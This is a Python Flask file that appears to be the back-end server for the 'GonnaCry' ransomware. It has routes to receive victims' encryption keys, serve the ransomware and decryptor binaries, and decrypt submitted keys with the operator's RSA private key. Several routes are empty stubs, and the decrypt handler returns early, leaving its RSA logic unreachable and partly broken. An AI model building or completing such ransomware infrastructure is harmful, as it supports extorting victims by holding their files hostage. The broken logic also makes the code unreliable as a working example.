from flask import Flask, redirect, request, Response
from flask import render_template, url_for
import os
import time
import base64
import json
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

binaries_path = 'binaries/'
gonnacry_binary = 'binaries/gonnacry'
decryptor_binary = 'binaries/decryptor'

headers = {'Server':'GonnaCry WebServer'}

with open("private_key.key") as f:
    private_key = f.read()

with open("public_key.key") as f:
    public_key = f.read()

app = Flask("gonnacry-web-server")

@app.errorhandler(404)
def page_not_found(error):
	return Response("nothing to do here ...", status=404, headers=headers)

@app.errorhandler(500)
def internal_error(error):
	return Response("nothing to do here ...", status=404, headers=headers)


@app.route("/recive-keys/", methods=['POST'])
def recive_keys():
    return ''


@app.route("/download-gonnacry/", methods=["GET"])
def download_gonnacry():
    return ''


@app.route("/download-decryptor/", methods=["GET"])
def download_decryptor():
    return ''


@app.route("/decrypt/", methods=['POST'])
def decrypt():
    data = request.data.decode('UTF-8')

    if(not data):
        return Response("No content.", status=411, headers=headers)

    try:
        data = base64.b64decode(data)
    except base64.binascii.Error:
        return Response('Wrong format key. Expected: b64encoded private key!', status=415, headers=headers)

    return Response(data, status=200, headers=headers)
    
    try:
        enc = json.loads(data)
    except:
        return Response('Error in the JSON', status=400, headers=headers)


    key = RSA.importKey(private_key)
    cipher = PKCS1_OAEP.new(key)
    try:
        decrypted = ""
        for i in enc:
            ciphertext = cipher.decrypt(i)
            decrypted += ciphertext
    except:
        return Response("Invalid private key!", status=400, headers=headers)
    return Response(decrypted, status=200, headers=headers)


@app.route("/")
def main():
    return 'nothing to do here ... '

if __name__ == '__main__':

    port = 8000
    host = '127.0.0.1'
    app.run(host=host, port=port)
